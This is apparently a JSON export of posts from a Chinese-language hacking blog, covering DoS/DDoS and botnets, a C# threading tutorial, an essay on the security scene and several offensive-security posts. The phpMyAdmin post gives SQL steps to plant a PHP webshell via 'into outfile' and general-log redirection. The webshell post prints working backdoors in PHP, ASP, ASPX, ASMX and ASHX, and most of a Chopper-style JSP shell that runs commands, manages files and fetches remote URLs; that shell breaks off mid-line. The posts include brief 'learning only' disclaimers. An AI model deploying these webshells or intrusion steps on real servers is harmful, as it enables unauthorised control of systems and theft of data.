[{"title":"【BlackHat】DoS，DDoS與BotNet","url":"/2023/06/12/%E3%80%90BlackHat%E3%80%91DoSandDDoS/","content":"前言DoS&#x2F;DDoS應該是小學生最喜歡的東西了，很多小學生和小屁孩都喜歡把說ddos然後就會覺得自己是黑客&#x2F;駭客。(PS: 作者習慣使用黑客一詞，本文也會使用該詞)在2015-2016年左右時，台灣當時有很多人喜歡使用LOIC這種工具，然後就說自己是黑客。事實上他們那跟本就不是甚麼DDoS，只是DoS罷了，也許是說成DDoS聽上去會比較強吧。作者曾經也是那樣的人，所以我很討厭以前的自己(現在其實也差不多啦…)。DoS絕對不是甚麼好玩的東西，它的確是一種黑客會用的手段，但它也許是門檻最低的，然而正是因為門檻低，所以很多人都不願深入了解。DoS&#x2F;DDoS需然看似很簡單，但是有很大的戰略價值，本文作者就打算記錄一下自己知道的，如果有一天我忘了也可以回來看，也算是給讀者們的科普。\n思考為甚麼要攻撃 ?是誰在攻撃 ?相信這都是每個網頁admin都會想過的問題，說出這方面的技術不是想讓你們去攻撃其他人，而是想讓你們知道相關原理，再進行防範。\nDisclaimer本文只限用於學習用途\nDoSIntroductionDoS全稱是 Denial of Server，技術上指的是發一大堆封包或Request到目標電腦上，讓目標因為過大的負荷而停止服務。DDoS多了一個 D (Distributed)所以本文會把 DDoS&#x2F;DoS的大部份技術都放在DoS上,而DDoS就會和BotNet一起討論\n舊時代的DoSPing of Death以前的電腦無法處理大於IPv4最大的封包大小(65535 bytes)的ping封包，在目標接收到該封包後電腦會Crash掉\nTearDrop發送損壞的封包，癱瘓系統。\n以上兩種在現代基本已經過時，以下是目前主流的攻撃方式\n現代常用的DoS技巧攻撃BandWidth\nICMP&#x2F;IGMP   \nUDP Flood\n\n反射+放大攻撃Introduction英文是DRDoS(Distributed Reflection Denial of Service),某些網路服務對於Request和Response之間長度大小的不一致，如果這時source IP可被偽造，那這個很大的Response就會直接發到受害者的電腦上，還可以隱藏攻撃者的IP。\nMethod\nACK Reflect\nDNS Reflect\nNTP Reflect\nSNMP\n\n系統資源消耗Method\nTCP Flood\nSYN Flood\nPSH + ACK\nRST Flood\nSockstress\n\n誤區DDoS&#x2F;DoS不全是Flood，的確目前大部份都是Flood，但也有所謂的 Low and Slow Attack  \nSSL攻撃IntroductionSSL : Secure Sockets Layer  \nMethod\nTHC SSL DoS\nSSL Flood\n\n攻撃應用資源Method\nDNS Query Flood\nDNS NXDomain\n\nWeb攻撃Method\nHTTP Flood\nSlowloris\nPOST\nReDoS\n\n漏洞型DoS找出網頁漏洞，該漏洞可把網頁直接卡死。\nMinecraft中的DoS普通DoS如上\nBOT發出特別的JSON封包到伺服器，該JSON封包在伺服器內構成虛擬玩家，達到伺服器最大人數時就會阻止其他正常玩定進入。同時虛擬玩家也可以進行無意義的洗版，進一步加重伺服器的負擔。\n現代DoS常用的工具綜合工具\nHping\nPenTBox\nZarp\n\n壓力測試壓力測試(StressTest)即合法的用DoS攻撃網站\n\nLOIC\nHOIC\nHULK\n\nPro\nSlowloris\nRUDY\nTHC SSL DOS\n\nDDoS &amp; BotNetIntroductionDDoS就是比DoS多了一個D(Distributed)\nTheoryBotNet技術目前BotNet的主要技術有四個\n\nIRC\nTCP Server &amp; Client\nHTTP\nP2P\n\n自願型BotNetBotNet可以用漏洞來「抓雞」，在受害者非自願的情況下進行攻撃，而自願型BotNet就是每個人都對目標發動DoS攻撃，很有名的Anonymous在過去就是這樣做的，每個成員都使用LOIC去攻撃。\nDDoS的戰術價值1.2. 用DDoS吸引人的注意，等企業內部人力資源集中在處理DDoS時，很有可能會被其他攻撃者以入侵的方式攻撃伺服器。歷史上真有其事，具體可參考「\nDDoS在黑色產業上的應用DDoS不止可以用來搞事情，還可以轉化為錢 :  \n\n競爭為了打撃對手而進行DDoS\n勒索中小型公句和企業一般不具備防DDoS的技術，而專業的防DDoS又需要錢。攻撃者往往會把價錢定在一個「合適」的數字，讓受害者就範。\n報復攻撃者們會利用個人要報復而去攻撃的情緒，提出DDoS的服務\n\nDDoS的防範Introduction目前沒有一個完美的技術可以防DDoS，因為DDoS本來就是因為網路設計上的問題所導致的，但是有緩解和治理的方法。\nBotNet的打撃對BotNet的處理在現實中是很困難的事，因為數量太多而且分散在不同地方。但目前也有幾種可行的方法 :   \n針對BotNet本身\nReverse Engineering : 取得樣本後把病毒特徵加到防毒軟體上，直接對成千上萬用戶檢查。\n接管或者摧毀BotNet : 很難的做法，一般需要政府間的合作，只有實力強大的跨國公司才可以做到，歷史上成功的例子就是Microsoft對Nitol的摧毀。\n\n直接封IP在以前中國GWF曾經因為技術上的問題而對國外做出疑似DDoS的行為，當時有幾個國家馬上封鎖中國的IP，當然了這招在現實中的中小企業不現實，除非攻撃者是使用DoS。\n針對Fake IP可以參考 CERT和IETF的方法\n\nCERT Advisory CA-1996-21\nRFC 2827\nUnicast Reverse Path Forwarding\n\n流量的稀釋\nCDN\nAnycast\n\n誤區\n防火牆可以防DDoS ?這是很大的誤會，強悍的DDoS反而會影響防火牆的運作效率。\n買更好的BandWidth好的BandWidth要更多的錢，而DDoS流量是用GB計算了，沒有太大的用處。\n\n","tags":["BlackHat","ddos","dos"]},{"title":"【Code】C# 元件Invoke的方法","url":"/2023/06/14/%E3%80%90Code%E3%80%91CSharpInvokeMethod/","content":"前言記錄一下C#中可以在Thread中存取Controls的方法\nC# 元件執行程式C# WindowsForm中我們可以把要執行的程式寫在元件的事件(Event)中，例如button1按下後可以彈出MessageBox的程式為\nprivate void button1_Click(object sender, EventArgs e)&#123;    MessageBox.Show(&quot;Hello world&quot;);    //MessageBox.Show(&quot;Hello world&quot;,&quot;Here is the test&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);&#125;\n\n如果我們要把Hello world顯示在TextBox1上，那程式就會是\nprivate void button1_Click(object sender, EventArgs e)&#123;    textBox1.Text = &quot;Hello world&quot;;&#125;\n\n需要時間的程式現在考慮一個ConsoleApplication要把數字 i &#x3D; 0 ~ 9999一行一行地顯示在Console上，這很簡單 :\nfor (int i = 0; i &lt; 10000; i++)&#123;    Console.WriteLine(i);&#125;\n\n可是如果在WindowsForm中要把 i &#x3D; 0 ~ 9999一行一行地顯示在textBox1上呢 ?\nfor (int i = 0 ; i &lt; 10000; i++)&#123;    textBox1.AppendText(i.ToString());    textBox1.AppendText(Environment.NewLine);&#125;\n然後把這程式放到Button1內 :\nprivate void button1_Click(object sender, EventArgs e)&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.AppendText(i.ToString());        textBox1.AppendText(Environment.NewLine);    &#125;&#125;\n好像很簡單對吧 ? 但事實不是這樣，當你執行後你會發現你的WindowsForm根本動不了，過了一段時間後WindowsForm可以動，然後數字 0 ~ 9999會突然出現在textBox1上，可是現在我想要的結果是數字會像在ConsoleApplication上一行一行地顯示在TextBox上，而不是這樣突然出現，何況程式還會突然卡死。\n原因UI Thread (Main Thread)WindowsForm在不使用其他Thread的時候在程式打開(打開.exe檔)的一刻到程式關掉時，所有事都會發生在UI Thread上，例如for loop，Thread.Sleep()，Button按鍵等等，甚至包括WindowsForm本身的上下左右移動，也就是說當你按下button1時，程式就會進入for loop，而此時for loop就是發生在UI Thread上，直到for loop結束，UI Thread才會從for loop跑出來，可是在for loop結束之前，你的for loop都無法跑出來，也就不能對WindowsForm進行住何操作，而數字顯示在textBox1上這件事也是發生在UI Thread上，但此時UI Thread還在for loop當中，所以這就是為甚麼你的程式不能移動，也不會馬上顯示數字。\n解決方法Thread這邊我們會想到可以建立一個新的Thread，用這個Thread去執行for loop，具體方法如下 :   \nvoid RunLoop()&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.AppendText(i.ToString());        textBox1.AppendText(Environment.NewLine);    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    new Thread(RunLoop).Start();&#125;\n看上去合理的程式，執行看看，又出現問題了，IDE會直接跟你說跨執行緒作業無效。\n原因新的Thread不能直接存取另外一個Thread，需要再加上一些東西，可以使用delegate或MethodInvoke的方法解決，這邊我提供一個我自己常用的方法，就是直接對元件Invoke\n對元件直接Invokevoid RunLoop()&#123;    for (int i = 0 ; i &lt; 10000; i++)    &#123;        textBox1.Invoke(new Action(() =&gt;         &#123;            textBox1.AppendText(i.ToString());            textBox1.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    new Thread(RunLoop).Start();&#125;\n如此一來，數字就可以一行一行顯示\n傳參數一個參數現在讓for loop的最大數字可控 :\nvoid RunLoop(object o)&#123;    for (int i = 0 ; i &lt; (int)o; i++)    &#123;        textBox1.Invoke(new Action(() =&gt;         &#123;            textBox1.AppendText(i.ToString());            textBox1.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(i.ToString())));        //textBox1.Invoke(new Action(() =&gt; textBox1.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    object o = 10;    new Thread(RunLoop).Start();&#125;\n\n多個參數現在讓for loop的最大數字可控且在指定TextBox顯示 :\nvoid RunLoop(object o)&#123;    object[] obj_array = (object[])o;    int max = (int)obj_array[0];    TextBox textbox = (TextBox)obj_array[1];    //TextBox textbox = obj_array[1] as TextBox;    for (int i = 0 ; i &lt; (int)o; i++)    &#123;        textbox.Invoke(new Action(() =&gt;         &#123;            textbox.AppendText(i.ToString());            textbox.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(i.ToString())));        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    int max = 100;    new Thread(new ParameterizedThreadStart(RunLoop)).Start(new object[]     &#123;        max, textBox1    &#125;);&#125;","categories":["Code"],"tags":["Code","C#","Program"]},{"title":"【Tech】[PenTest] phpMyAdmin的getshell方法","url":"/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/","content":"前言在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。   \n環境\nWindows 11\nApache + php8.2\nphpMyAdmin\n\n前提需要以下條件\n\nphpMyAdmin最好是root帳號\n知道Absolute Path (本文使用 D:&#x2F;xampp&#x2F;htdocs)\n\n實戰Geshell方法phpMyAdmin getshell一般有兩種方法 :  \n\nSQL getshell\n後端 getshell\n\n第一種是使用SQL把webshell寫到伺服器上，第二種是改後端密碼上傳webshell。\nSQL getshell常用方法 - 使用 select into outfile這應該是最常用的方法了，在知道路徑的情況下可以用這招\nselect load_file(&#x27;D:/xampp/htdocs&#x27;);select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;D:/xampp/htdocs&#x27;;\n這是最簡單的方法，也是很容易失敗的方法，大部份網頁admin都不是傻的，他們會有設定檔案權限，此時執行\nSHOW VARIABLES LIKE &quot;secure_file_priv&quot;;\n\nValue一般會有兩種結果\n\nFolder路徑 : 代表只有該路徑才可以修改\nNULL : 禁止修改\n\nLog寫shellMySQL 5.0以上會自動寫Logs，把執行過的SQL指令都寫進一個.log檔，那如果此時的檔案不是.log而是.php呢?  \n執行以下指令\nSHOW VARIABLES LIKE &#x27;general%&#x27;;\n\nset global general_log = &quot;ON&quot;;set global general_log_file=&quot;D:/xampp/htdocs/shell.php&quot;;\n就會在D:&#x2F;xampp&#x2F;htdocs 生成一個shell.php然後再   \nselect &#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;&#x27;\n就可以getshell了\n技巧最簡單的php一句話木馬   \n&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;\n也是最容易被防毒查出來的，如果webshell的code寫得比較多可以把webshell base64加密，再使用php的 base64_decode(); 函數解密。\n注意Log寫webshell的方法動作會很大的，會很容易被發現。另外記得要把一開始的.log檔案記下，不然你會無法還原。\n後端GetShell後端登入\n以wordpress為列子，phpMyAdmin+wordpress是比較容易getshell的，因為wordpress是基於php的，而後端一般都會有檔案修改和上傳等功能。Wordpress登入後端目前還算是很容易的，兩種做法 :   \n\n破解密碼Hash\n在無法破解的情況下直接改密碼\n\n\nWordPress加密後的密碼很上去很亂，但要改也不難，假設你的新密碼是admin，那就把admin以MD5加密，把MD5 Hash換進去就可以了。\n\nGetShell方法一般三種方法   \n\n模版上傳\nPlugin上傳\n直接插入一句話木馬\n\n這種用第三種會比較好，因為前兩種都比較容閉被發現。\n","tags":["pentest","php","phpmyadmin","getshell","webshell"]},{"title":"【Nonsense】資安圈 = 娛樂圈 ? 對資安圈現在的想法","url":"/2023/06/12/%E3%80%90Nonsense%E3%80%91hack-entertain/","content":"前言一直以來黑&#x2F;駭客(本文用黑客一詞)給人的感覺都是很神秘和很帥，在很多電影中黑客給一種就是救埸王的感覺，小事就是入侵手機，大事就是入侵衛星。但真的是這樣嗎 ?我在資安這圈子時間也不算短了，打算分享一下我的想法。\n\n技術的發展從古到今一直都有出現很多很令人興奮的新技術，這些技術不管是在文化還是科技上都把文明的時鐘推前了一大步，這些技術發展到今都有有些共同的特徵，會出現現狂熱朝，大家都在討論這種技術，當技術慢慢地成熟時，技術的細節已經不是大眾能理解的了，而是由幾個這方面領域的專家開拓的。那技術成熟之後呢 ? 當大家都可以接觸到這種技術的表面時，就會出現很奇怪的現像，大家都想分高下，看看誰能了解得更多，每當有人對這件事進行提問題，大家都會爭先恐後地發表自己所知道的。\n\n對黑客的印象現實大眾對黑客的印象大眾對黑客的印象大概就是「天才」之類的。\n動漫中的黑客全是美少女，帥哥\n電影中的黑客全是帥哥美女，\n現實中的黑帽黑客做不好就等死吧。\n\n媒體的渲染媒體很喜歡把少年黑客叫做「天才」「最強」\n資安VS畫畫在美術領域中從來不乏年輕而且畫畫很漂亮的人，在資安領域也是一樣，但是可以被同行稱為高手或大師的人又有多少個 ?我以前也有做過類似的事，可是後來我覺得這是很愚蠢的行為。\n\n黑客甚麼都能黑?這是很大的誤會，以iphone為例子，雖然一直有一個說法是iphone有國家的後門存在，但要破解Iphone這種手機對大部分黑客(白帽+黑帽)都絕對不是甚麼容易的事，本文中第一部份說到入侵手機是一事「小事」，如果你指的入侵是任何一個人的手機只要有打開就能入侵的話，那這絕對不是甚麼小事。有很多人一聽到黑客這兩個事就會問他「你能幫我破解FB嗎 ?」大概在大眾的眼中破解一個帳號是一件很容易的事。漏洞找不到就是找不到，就像100%的HTML網頁，只有hello world的程式你要資安人士在這找出漏洞，他大概只會想打你。\n\n找漏洞是很有趣的事 ?能找到漏洞然後寫出Exploit或者POC當然有趣，那要是找不到呢 ?相信有滲透相關經驗的人都體驗過那種坐在電腦前甚麼都找不到的感想，然後還是寫一個簡單的reflect xss在報告上。\n\n實力上的比較比較的意義全心全意討論技術的人可以說是越來越少了，很多人學了資安相關的技術就要馬上告訴全世界自己是黑客，能得到身邊同年齡人的認可的確很重要，但絕對不是用這種方法。\n領域的比較一直有人覺得黑客有所謂的最強，首先資訊安全是一個很大的領域，密碼破解、滲透測試、緩衝區溢位、物聯網安全、大規模監控、大規模掃瞄、數據修改、黑帽SEO等等…不同領域的實力強弱比較是沒有太大意義的，就好像要在跑步和跳高兩個領域進行比較並不合理一樣。如果要比較，那就應該是對社會XXX或者年薪等等有共通點的比較。\nBug Bounty計劃Bug Bounty的確是一個能看排名的計劃，2016年大陸的烏雲網還沒關閉時就有一個長期在榜一的大哥，叫做豬豬俠(曾發現阿里巴巴，百度等等存在高危漏洞)，Bug Bounty的漏洞是會以分數進行計算的，如此一看那的確是可以在滲透方面分出高下。\n工具編寫寫工具也是一個很多比較的方法，總會有人因為寫出很有名和很好用的工具而成名\n黑客與英雄主義資安領域也有著英雄主義，會有黑客因為做出某件事而被大眾稱為英雄，\nOpenBSD crowd is a bunch of masturbating monkeys — Linus\n這句話是Linux之父Linus罵OpenBSD的話，因為Linus認為軟體的bug比安全漏洞還要多，而資安人士因為找到漏洞成為英雄但忽略了一般bug的問題。\n","categories":["Nonsense"],"tags":["nonsense","thinking","hacker"]},{"title":"【Tech】[SQL]SQL注入取得使用者帳號密碼的方法","url":"/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/","content":"前言記錄幾個在sql注入中可以把database user, password拿出來的方法\nSQLMapsqlmap.py -u xxx --passwords\n\nSQL Query//MySQLselect host,user,password from mysql.user;//SQL Server 2022SELECT name, CONVERT(varchar(max), password_hash, 1) AS hashed_password FROM sys.sql_logins"},{"title":"【Tool】SiteHunter","url":"/2023/06/06/%E3%80%90Tool%E3%80%91SiteHunter/","content":"簡介SiteHunter是一個用C#編寫的網站掃瞄工具，功能如下 :  \n\nC段掃瞄\n目錄掃瞄\n子域名爆破\nUrl Collector\n\nGitHubhttps://github.com/malbuffer4pt/SiteHunter\nScreenshot\n","categories":["Tools"],"tags":["pentest","SiteHunter","Information","Scan","C段掃瞄","旁注","子域名","目錄爆破","工具"]},{"title":"【Tech】一句話木馬","url":"/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/","content":"甚麼是WebShellWebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種 :- 大馬 : 檔案大，30~70KB以上，加密後會超過100KB。- 小馬 : 檔案小，一般在10KB以下    - 指令執行木馬 : 只能簡單地執行的Shell Command.    - 一句話木馬 : 功能可超越大馬，容易隱藏和改造。             \n   一句話木馬在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，大馬的好處是所有執行的Payload都是在localhost上進行，不使用HTTP POST，可以不考慮WAF，但因為檔案太大很容易會被發現，而且不容易寫變種。一句話木馬雖然會因為使用HTTP POST會被WAF檢查，但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。\n\n一句話木馬客戶端指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 :\n\n蟻劍\nGodzilla\n冰蝎\n\n這邊推一下我自己寫的Alienhttps://malbuffer4pt.github.io/Alien\n\n一句話木馬的程式在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器如下圖 (工具: Alien)\n以php為例，PHP一句話木馬為  \n&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;\n$_POST[‘pass’] : 取得HTTP POST參數為pass的Data@eval($str); : 把 $str 以PHP Code執行  , @ 代表如果 $str &#x3D;&#x3D; null時就不顯示結果(這樣就增加了隱密性。)所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :   \npass=phpinfo();\n就可執行phphinfo();  \nASP :  \n&lt;% execute(request(&quot;pass&quot;)) %&gt;\n\nASPX :  \n&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;])%&gt;\n\n關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，這也有寫進Alien內。而CFM是一個很老的東西了…\nASMX&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;import System;import System.Web;import System.IO;import System.Web.Servicesimport System.Web.Script.Servicespublic class ScriptMethodSpy extends WebService&#123;          WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void    &#123;            var I = HttpContext.Current;        var Request = I.Request;        var Response = I.Response;        var Server = I.Server;    Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;);        eval(Ivan);    &#125;&#125;\n\nASHX&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;import System;import System.Web;import System.IO;public class HandlerSpy implements IHttpHandler&#123;   function IHttpHandler.ProcessRequest(context : HttpContext)&#123;           context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;);           eval(context.Request[&quot;Ivan&quot;]);        &#125;    function get IHttpHandler.IsReusable() : Boolean&#123;            return false;       &#125;&#125;\n\nJSPJSP目前主要有兩種，菜刀形和冰蝎形菜刀形 :\n&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;sky&quot;;String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;);&#125;else&#123;sF+=l[i].getName()+&quot;\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;;&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;);&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);&#125;r.close();&#125;catch(Exception e)&#123;sb.append(&quot;Result\\t|\\t\\r\\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\\t|\\t\\r\\n&quot;);&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\\t|\\t\\r\\n&quot;);&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;br.close();&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// 